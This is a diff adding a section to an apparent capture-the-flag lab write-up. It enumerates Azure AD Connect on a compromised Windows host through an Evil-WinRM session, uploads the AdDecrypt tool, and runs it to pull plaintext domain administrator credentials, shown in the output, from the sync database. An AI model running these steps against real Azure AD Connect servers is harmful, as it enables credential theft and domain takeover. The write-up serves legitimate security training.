@@ -427,6 +427,104 @@ The command completed successfully.
 
 <br />
 
+The Azure-related components are located under `C:\Program Files`:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Program Files> dir *Azure*
 
 
+    Directory: C:\Program Files
 
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
+d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
+```
+
+<br />
+
+These folders confirm that `Azure AD Connect` is installed on the system.
+
+<br />
+
+## Azure Exploitation
+
+<br />
+
+[This post](https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) details a known vulnerability in the `Azure AD Connect` database component.
+
+The `Azure AD Connect` service is responsible for synchronizing accounts and credentials between the on-premises Active Directory and Azure AD. The idea of the exploitation is that we can extract plaintext credentials for the AD account configured within the sync service by running the exploit inside the `zip` of the following [GitHub repository](https://github.com/VbScrub/AdSyncDecrypt/releases):
+
+<br />
+
+To proceed, we download the ZIP file and extract its contents:
+
+<br />
+
+```bash
+❯ unzip AdDecrypt.zip
+Archive:  AdDecrypt.zip
+  inflating: AdDecrypt.exe           
+  inflating: mcrypt.dll              
+```
+
+<br />
+
+Next, we upload both `AdDecrypt.exe` and the required `mcrypt.dll` to the victim machine.
+
+We can do this from our current `evil-winrm` session:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\users\mhope\Documents> upload AdDecrypt.exe
+                                        
+Info: Uploading /opt/AdDecrypt.exe to C:\users\mhope\Documents\AdDecrypt.exe
+                                        
+Data: 19796 bytes of 19796 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\users\mhope\Documents> upload mcrypt.dll
+                                        
+Info: Uploading /opt/mcrypt.dll to C:\users\mhope\Documents\mcrypt.dll
+                                        
+Data: 445664 bytes of 445664 bytes copied
+                                        
+Info: Upload successful!
+```
+
+<br />
+
+Finally, we only need to run the `AdDecrypt.exe` binary with the `-FullSQL` flag:
+
+⚠️ Note: It's important to run the binary from `C:\Program Files\Microsoft Azure AD Sync\Bin`, as the exploit relies on local configuration and dependencies that exist only in that directory.
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
+
+======================
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+======================
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+```
+
+<br />
